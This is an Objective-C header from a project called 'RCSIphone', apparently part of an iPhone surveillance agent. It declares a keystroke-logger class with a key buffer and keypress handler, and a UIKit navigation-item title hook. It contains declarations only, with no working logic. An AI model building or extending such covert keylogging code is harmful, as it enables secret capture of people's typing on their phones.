//
//  RCSIAgentInputLogger.h
//  RCSIphone
//
//  Created by revenge on 3/8/10.
//  Copyright 2010 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

#define KEY_MAX_BUFFER_SIZE   0x10


@interface RCSIKeyLogger : NSObject
{
@private
  NSMutableString *mBufferString;
  //BOOL mContextHasBeenSwitched;
}

- (id)init;
- (void)dealloc;

- (void)keyPressed: (NSNotification *)aNotification;

@end

@interface myUINavigationItem : NSObject

- (id)title;
- (void)setTitleHook: (id)arg1;

@end